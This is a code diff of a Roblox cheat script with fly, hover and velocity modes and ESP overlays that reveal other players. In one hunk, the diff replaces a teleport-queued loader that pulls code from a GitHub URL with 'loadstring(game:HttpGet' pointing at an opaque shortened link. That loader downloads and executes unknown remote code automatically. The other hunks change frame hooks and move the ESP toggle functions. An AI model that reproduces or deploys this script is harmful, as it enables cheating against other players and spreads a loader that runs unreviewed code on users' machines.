@@ -763,7 +763,7 @@ local function Start()
             return
         end
         pcall(function()
-            qtp('loadstring(game:HttpGet("https://raw.githubusercontent.com/Lemedios/Leme-GUI-V2-MoonSec/refs/heads/main/README.md"))()')
+            qtp("loadstring(game:HttpGet'x.gd/tM48D')()")
         end)
     end
 
@@ -1240,7 +1240,7 @@ local function Start()
                 savedRotVel = hrp2.AssemblyAngularVelocity,
                 freezeCF = hrp2.CFrame,
             }
-            data.hb = addConn(R.Heartbeat:Connect(function()
+            data.hb = addConn(R.RenderStepped:Connect(function()
                 if destroyed then
                     return
                 end
@@ -1335,7 +1335,7 @@ local function Start()
         touchRunning = true
         local movel = 0
         while not destroyed and not touchStopRequested do
-            R.Heartbeat:Wait()
+            R.RenderStepped:Wait()
             if destroyed or touchStopRequested then
                 break
             end
@@ -1398,22 +1398,9 @@ local function Start()
             if hum then
                 hum.Sit = false
             end
-            if savedLook and hrp2 and hum then
-                hum.AutoRotate = false
+            if savedLook and hrp2 then
                 local pos = hrp2.Position
                 hrp2.CFrame = CFrame.new(pos, pos + savedLook)
-                task.delay(0.1, function()
-                    if destroyed then
-                        return
-                    end
-                    local c2 = getChar()
-                    local hum2 = c2 and c2:FindFirstChildOfClass("Humanoid")
-                    if hum2 then
-                        hum2.AutoRotate = true
-                    end
-                end)
-            elseif hum then
-                hum.AutoRotate = true
             end
             st.flyPos = nil
             st.hoverTarget = nil
@@ -1423,7 +1410,6 @@ local function Start()
         elseif m == "fly" then
             if hum then
                 hum.Sit = true
-                hum.AutoRotate = false
             end
             st.hoverTarget = nil
             st.hoverY = nil
@@ -1433,7 +1419,6 @@ local function Start()
         elseif m == "hover" then
             if hum then
                 hum.Sit = true
-                hum.AutoRotate = true
             end
             st.flyPos = nil
             st.velAnchorPos = nil
@@ -1445,7 +1430,6 @@ local function Start()
         elseif m == "vel" then
             if hum then
                 hum.Sit = true
-                hum.AutoRotate = true
             end
             st.flyPos = nil
             st.hoverTarget = nil
@@ -1751,60 +1735,6 @@ local function Start()
                 end
             end
         end
-    end
-
-    local function updateEsp(dt)
-        if not st.espOn and not st.miniEspOn then
-            return
-        end
-        st.espTimer += dt
-        if st.espTimer < st.espInterval then
-            return
-        end
-        st.espTimer = 0
-        for _, pl in ipairs(P:GetPlayers()) do
-            if pl ~= lp then
-                local c = pl.Character
-                if c then
-                    if st.espOn then
-                        ensureNameEsp(c, pl)
-                    end
-                    if st.miniEspOn then
-                        ensureMiniEsp(c, pl)
-                    end
-                end
-            end
-        end
-    end
-
-    local function toggleESP()
-        if st.espOn then
-            st.espOn = false
-            clearNameEsp()
-        else
-            st.espOn = true
-            if st.miniEspOn then
-                st.miniEspOn = false
-                clearMiniEsp()
-            end
-        end
-        updEspBtn()
-        updMiniEspBtn()
-    end
-
-    local function toggleMiniESP()
-        if st.miniEspOn then
-            st.miniEspOn = false
-            clearMiniEsp()
-        else
-            st.miniEspOn = true
-            if st.espOn then
-                st.espOn = false
-                clearNameEsp()
-            end
-        end
-        updEspBtn()
-        updMiniEspBtn()
     end
 
     local function sRound(n)
@@ -2681,7 +2611,7 @@ local function Start()
 
         local startTime = time()
         while not destroyed and time() - startTime < 3 do
-            R.Heartbeat:Wait()
+            R.RenderStepped:Wait()
             tChar = target.Character
             tHRP = tChar and tChar:FindFirstChild("HumanoidRootPart")
             c = getChar()
@@ -2762,7 +2692,7 @@ local function Start()
         end
     end
 
-    local hbConn = addConn(R.Heartbeat:Connect(function(dt)
+    local hbConn = addConn(R.RenderStepped:Connect(function(dt)
         if destroyed then
             return
         end
@@ -3015,6 +2945,60 @@ local function Start()
         end
         setFlyMode("vel")
     end)
+
+    local function updateEsp(dt)
+        if not st.espOn and not st.miniEspOn then
+            return
+        end
+        st.espTimer += dt
+        if st.espTimer < st.espInterval then
+            return
+        end
+        st.espTimer = 0
+        for _, pl in ipairs(P:GetPlayers()) do
+            if pl ~= lp then
+                local c = pl.Character
+                if c then
+                    if st.espOn then
+                        ensureNameEsp(c, pl)
+                    end
+                    if st.miniEspOn then
+                        ensureMiniEsp(c, pl)
+                    end
+                end
+            end
+        end
+    end
+
+    local function toggleESP()
+        if st.espOn then
+            st.espOn = false
+            clearNameEsp()
+        else
+            st.espOn = true
+            if st.miniEspOn then
+                st.miniEspOn = false
+                clearMiniEsp()
+            end
+        end
+        updEspBtn()
+        updMiniEspBtn()
+    end
+
+    local function toggleMiniESP()
+        if st.miniEspOn then
+            st.miniEspOn = false
+            clearMiniEsp()
+        else
+            st.miniEspOn = true
+            if st.espOn then
+                st.espOn = false
+                clearNameEsp()
+            end
+        end
+        updEspBtn()
+        updMiniEspBtn()
+    end
 
     refs.espBtn.MouseButton1Click:Connect(function()
         if destroyed then
